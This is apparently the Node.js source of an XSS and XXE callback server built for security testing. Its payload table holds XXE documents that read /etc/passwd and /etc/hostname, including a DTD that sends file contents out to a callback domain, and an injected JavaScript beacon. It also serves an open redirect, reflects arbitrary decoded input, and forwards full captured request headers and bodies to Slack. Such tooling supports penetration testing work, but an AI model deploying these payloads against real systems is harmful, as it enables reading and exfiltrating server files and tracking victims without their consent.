// content of index.js
const http = require('http');
const https = require('https');
const fs = require('fs');
const port = 3000
const querystring = require('querystring');

const SLACK_URL = process.env.SLACK_URL
const SLACK_CHANNEL = process.env.SLACK_CHANNEL || '#borked'
const SLACK_USER = process.env.SLACK_USER || 'hookbot'
const SLACK_ICON = process.env.SLACK_ICON || ':ghost:'
const DEFAULT_DOMAIN = process.env.DEFAULT_DOMAIN
const ALERT_PATTERN = 'H'

const PAYLOADS = {
  'sh': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`
  },
  'dt': {
    contentType: 'text/xml',
    content: `<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://${DEFAULT_DOMAIN}/${ALERT_PATTERN}/xxe-test" >]><foo>&xxe;</foo>`,
  },
  'evil.dtd': {
    contentType: 'text/xml',
    content: `<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://${DEFAULT_DOMAIN}:80/${ALERT_PATTERN}/xxe?p=%payl;'>">`
  },
  'js': {
    contentType: 'text/javascript',
    content: `var s = document.createElement("img");document.body.appendChild(s); s.src="//${DEFAULT_DOMAIN}/${ALERT_PATTERN}/s";`
  },
  'ht': {
    contentType: 'text/html',
    content: `<html><body><img src="/${ALERT_PATTERN}/static-lh" /><iframe src="file:///etc/passwd" height="500"></iframe></body></html>`
  },
  'sv': {
    contentType: 'image/svg+xml',
    content: `<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`
  },
  'logo': {
    contentType: 'image/svg+xml',
    content: '<svg xmlns="http://www.w3.org/2000/svg" version="1.0" width="48" height="54" viewBox="0 0 257.002 297.5" xml:space="preserve"><g transform="translate(-122,-17.5) " id="DFKTVRFI"><g id="pirate-hat"><path fill="#3A6E35" stroke="#000000" stroke-width="3" stroke-miterlimit="10" d="M325,153.896v-25l-7.5-0.5v-11.782 C316,112.332,298,96.396,298,96.396c-24.5-27.5-68-13.5-68-13.5c-18,3-34.5,30.5-34.5,30.5v21.5h-6v19c0,0-19-33.5-34.5,0v37h37 c0,0,16.5-14.5,18,5.5l122.5,1.5v-34.5C332.5,163.396,330.5,152.896,325,153.896z"/><line fill="none" stroke="#587F49" stroke-width="5" stroke-miterlimit="10" x1="268" y1="92.896" x2="305.75" y2="130.646"/><polygon fill="#DBECD3" stroke="#000000" stroke-miterlimit="10" points="264.207,98.396 223.832,98.396 223.832,104.896 217.332,104.896 217.332,112.396 213.832,112.396 213.832,125.896 217.832,125.896 217.666,132.396 227.5,132.396 227.666,138.729 234.832,138.729 234.832,132.062 241,132.062 240.832,138.729 248.166,138.729 248.166,131.729 254.166,131.729 254.332,138.729 262.832,138.729 262.832,131.896 271.832,131.895 271.875,125.603 275,125.729 275,112.229 271.582,112.27 271.5,104.396 264.157,104.396"/><rect x="224.082" y="111.271" stroke="#000000" stroke-miterlimit="10" width="11.375" height="11.375"/><rect x="250.082" y="111.271" stroke="#000000" stroke-miterlimit="10" width="11.375" height="11.375"/><line fill="none" stroke="#587F49" stroke-width="5" stroke-miterlimit="10" x1="179" y1="154.896" x2="187.25" y2="163.146"/></g><path fill="#A3CE89" d="M199,152.896l-4.5,4v21.5h-3l0.25,22.5H199l2.5-7.5l119,0.5v-17c0,0-7.5-20.5-21.5-6.5c0,0,0,2-4.5,0.5 l-0.5-11.5l-6.75-6.5H199z"/><polyline fill="none" stroke="#000000" stroke-width="4" stroke-miterlimit="10" points="207,163.396 217.5,163.396 231,177.896"/><polyline fill="none" stroke="#000000" stroke-width="4" stroke-miterlimit="10" points="254.5,177.896 269,163.396 283,163.396"/><rect x="213" y="176.396" fill="#75AA66" width="8" height="10.5"/><rect x="211" y="176.396" fill="#7EC352" stroke="#75AA66" stroke-width="0.25" stroke-miterlimit="10" width="8" height="10.5"/><rect x="213.832" y="180.112" fill="#C5E1AC" stroke="#75AA66" stroke-width="0.25" stroke-miterlimit="10" width="2.336" height="3.066"/><line fill="none" stroke="#75AA66" stroke-width="2" stroke-miterlimit="10" x1="237.75" y1="188.646" x2="238" y2="192.396"/><line fill="none" stroke="#75AA66" stroke-width="2" stroke-miterlimit="10" x1="248.75" y1="188.646" x2="249" y2="192.396"/><path fill="#4C773E" d="M244,152.396c0,0,5.25,12.25,15,18.75c0,0-3.25,16.5,10.75,16.25l10.5,0.003c0,0,6,7.997,7.5,7.997h6 l-8.25-8.75c0,0,8-6.25,0.25-20.75l-28.25,0.25l-10.5-13.75h-2H244z"/><polygon fill="#75C26E" points="203.125,196.812 203.125,202.313 196.5,202.313 196.5,225.021 291.625,225.021 289.75,196.812 "/><rect id="mouth-bakground" x="209.5" y="195.396" fill="#3A6E35" width="71" height="21.25"/><polygon id="beard" fill="#101B0F" points="276,192.646 199.75,192.646 199.75,199.146 191.75,199.146 191.75,236.146 205.25,236.146 206.25,242.646 213.5,242.646 213.5,249.146 227.25,249.146 227,255.396 266,255.396 265.5,248.146 279.25,248.896 279.25,241.896 286,241.896 286,235.396 299,235.396 299,192.646 288.5,192.646 288.812,224.021 199.25,224.021 199.75,204.396 206,204.458 206,197.896 289.188,198.177 289.125,192.614"/><g transform="matrix(1,0,0,1,0,12)" id="bottom-teeth"><rect x="209.5" y="205.271" fill="#EBF5E9" stroke="#000000" stroke-miterlimit="10" width="75.125" height="11.375"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="220.5" y1="212.646" x2="220.5" y2="216.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="231.5" y1="212.646" x2="231.5" y2="216.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="241.5" y1="212.646" x2="241.5" y2="216.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="251.5" y1="212.646" x2="251.5" y2="216.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="260.5" y1="212.646" x2="260.5" y2="216.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="270.5" y1="212.646" x2="270.5" y2="216.396"/></g><g id="top-teeth"><rect x="206.125" y="198.021" fill="#EBF5E9" stroke="#000000" stroke-miterlimit="10" width="50.25" height="13.25"/><rect x="267" y="198.021" fill="#EBF5E9" stroke="#000000" stroke-miterlimit="10" width="13.5" height="13.25"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="215.5" y1="198.646" x2="215.5" y2="202.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="226.5" y1="198.646" x2="226.5" y2="202.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="236.5" y1="198.646" x2="236.5" y2="202.396"/><line fill="#FFFFFF" stroke="#000000" stroke-width="0.5" stroke-miterlimit="10" x1="246.5" y1="198.646" x2="246.5" y2="202.396"/></g></g></svg>'
  }
}

function slackPost(text) {
  console.log('slackpost');

  let payload = querystring.stringify({
    payload: JSON.stringify({
      "channel": SLACK_CHANNEL,
      "username": SLACK_USER,
      "icon_emoji": SLACK_ICON,
      "text": text
    })
  });

  let url = new URL(SLACK_URL);
  let opts = {
    hostname: url.hostname,
    port: 443,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': payload.length
    }
  };
  let req = https.request(opts, (res) => {
    console.log('statusCode:', res.statusCode);
    console.log('headers:', res.headers);
    res.on('data', (d) => {
      console.log(d.toString('utf8'));
    });
  });

  req.on('error', (e) => {
    console.error(e);
  });
  req.write(payload);
  req.end();
}

function isNumeric(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}

const requestHandler = (request, response) => {

  // start of new HTTP request
  let requestDataSlabList = [],
    httpMethod = request.method.toUpperCase(),
    requestURI = request.url;

  // wire up request events
  request.on('data', (data) => {
    // add received data to buffer
    requestDataSlabList.push(data);
  });

  request.on('end', (data) => {
    console.log('vvvvvvvvvvvvvvvvvvvvvvv');
    console.log(new Date().toUTCString());

    let reqAr = requestURI.split('/');
    let redir;
    reqAr.shift(); // remove first empty entry
    let mode = reqAr.shift();
    let remoteAddr = request.headers['x-real-ip'];
    let code;
    let assigned_code;
    response.setHeader('Server', 'BreakfastBot/1.1');
    response.setHeader('Access-Control-Allow-Origin', '*');

    // write/append received request to file
    let headerItemList = [],
      userAgent = 'no user agent',
      dataSlab = requestDataSlabList.join('');

    for (let headerItem of Object.keys(request.headers).sort()) {
      if (headerItem.match(/user\-agent/i)) {
        userAgent = request.headers[headerItem];
      }
      headerItemList.push(`${headerItem}: ${request.headers[headerItem]}`);
    }

    console.log(
      `-----\n${httpMethod} ${requestURI}\n` +
      `${headerItemList.join('\n')}\n\n${dataSlab}\n\n`
    );

    switch (mode) {
      case 'robots.txt':
        response.statusCode = 200;
        response.end('User-agent: *\nDisallow: /')
        break;
      case 'unfurly':
        response.setHeader('Content-Type', 'text/html')
        response.end([
          `<html><head>`,
          `<meta property="og:title" content="Unfurly" />`,
          `<meta property="og:description" content="${userAgent}" />`,
          //`<meta name="twitter:image:src" value="" />`,
          `<meta name="twitter:label1" value="IP Address" />`,
          `<meta name="twitter:data1" value="${remoteAddr}" />`,
          `<meta name="twitter:label2" value="" />`,
          `<meta name="twitter:data2" value="" />`,
          `</head><body>`,
          `</body></html>`,
        ].join("\n"))
        break;
      case 'json':
        response.setHeader('Content-Type', 'application/json"')
        if (reqAr[0] == 'b64') {
          reqAr.shift(); // remove b64
          content = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
        } else {
          content = unescape(reqAr.join('/'));
        }
        response.end(content);
        break;
      // case 'html':
      //   if (reqAr[0] == 'b64') {
      //     reqAr.shift(); // remove b64
      //     content = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
      //   } else {
      //     content = unescape(reqAr.join('/'));
      //   }
      //   response.end(content);
      //   break;
      case 'redirect':
        if (reqAr[0] == 'b64') {
          reqAr.shift(); // remove b64
          redir = new Buffer(reqAr.join('/'), 'base64').toString('ascii')
        } else {
          redir = reqAr.join('/');
        }
        response.statusCode = 301;
          response.setHeader('Location', redir.split('?')[0]);
          console.log('* Redirect', redir)

        response.end('i am dead')
        break;
      case ALERT_PATTERN + 'x':
        let xPayload = PAYLOADS[reqAr.shift()] || 'pizza'
        slackPost(
          'XSS Hook use detected ```' +
          `-----\n${httpMethod} ${requestURI}\n` +
          `${headerItemList.join('\n')}\n\n${dataSlab}\n\n` +
          '```'
        );
        response.setHeader('content-type', xPayload.contentType || 'text/plain');
        response.end(xPayload.content);
        break;
      case ALERT_PATTERN:
        console.log('XSS Callback');
        response.statusCode = 200
        slackPost(
          'XSS Hook use detected ```' +
          `-----\n${httpMethod} ${requestURI}\n` +
          `${headerItemList.join('\n')}\n\n${dataSlab}\n\n` +
          '```'
        );
        if (request.body && request.body.match(/challenge/)) {
          response.end(JSON.parse(request.body).challenge);
          break;
        } else if (requestURI.match(/\.mp4$/)) {
          response.setHeader('content-type', 'video/mp4');
          // i am an mp4, I promise
          response.end("\x00\x00\x00\x20\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00");
          break;
        }
      case 'a':
      default:
        response.statusCode == 200;
        if (mode == 'a') {
          response.statusCode = 401
          response.setHeader('WWW-Authenticate', 'Basic realm="Event Login"')
        }
        response.setHeader('content-type', PAYLOADS.logo.contentType);
        response.end(PAYLOADS.logo.content)
        break;
    }
    console.log('^^^^^^^^^^^^^^^^^^^^^^^');
  });
}

const server = http.createServer(requestHandler)
server.listen(port, (err) => {
  if (err) {
    return console.log('something bad happened', err)
  }
  console.log(`server is listening on ${port}`)
})
